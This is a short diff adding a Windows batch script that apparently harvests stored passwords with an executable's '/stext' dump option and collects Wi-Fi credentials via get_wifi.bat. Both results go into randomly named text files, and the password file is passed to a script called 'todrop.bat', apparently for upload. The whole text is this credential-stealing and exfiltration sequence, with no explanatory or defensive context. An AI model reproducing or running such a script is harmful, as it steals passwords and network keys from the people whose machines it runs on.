@@ -1,0 +1,12 @@
+set /a "random_number=!RANDOM! %% 100 + 1"
+set "random_string=pasw!random_number!"
+my.exe /stext !random_string!.txt
+
+
+set "random_w=wifi!random_number!"
+get_wifi.bat > !random_w!.txt
+
+timeout /t 5 > NUL
+
+todrop.bat !random_string!.txt
+
